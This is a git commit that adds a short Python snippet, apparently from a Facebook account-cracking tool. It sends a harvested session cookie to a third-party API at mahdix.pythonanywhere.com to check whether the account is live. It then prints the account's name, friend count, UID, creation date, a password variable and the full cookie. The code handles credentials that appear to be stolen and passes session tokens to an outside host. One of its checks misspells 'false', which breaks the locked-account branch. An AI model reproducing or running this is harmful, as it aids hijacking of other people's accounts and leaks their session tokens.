5bcfc56bda77885670cb16b9490d65e9e7db2029
Mahdi Hasan Shuvo <98658558+Shuvo-BBHH@users.noreply.github.com>
2023-08-17 14:01:01 +0600

    Create name_friends_uid_c_date_liveck_all_in_one.py

---
+++ name_friends_uid_c_date_liveck_all_in_one.py
@@ -0,0 +1,13 @@
+url=f'https://mahdix.pythonanywhere.com/fbapi?cooki={coki}'
+ckapi=requests.get(url).json()
+lock=ckapi["Live"]
+if 'True' in lock:
+    print(mahdix.mahdilinx())
+    print(f"{mahdix.LI_WHITE}Name : {mahdix.LI_YELLOW}{ckapi['name']}")
+    print(f"Friends : {mahdix.LI_CYAN}{ckapi['friends']}")
+    print(f'[MAHDI OK] {mahdix.LI_GREEN}{ckapi["uid"]}  | {ps}   | ==> {ckapi["c_date"]}')
+    print(f'[💚]=COOKIE : {mahdix.LI_WHITE}'+coki)
+if 'fasle' in lock:
+    print('ID HASBEEN LOCKED ')
+    print(f'[MAHDI OK]{ckapi["uid"]}  | {ps}   | ==> {ckapi["c_date"]}')
+    print(f'[💚]=COOKIE : '+coki)
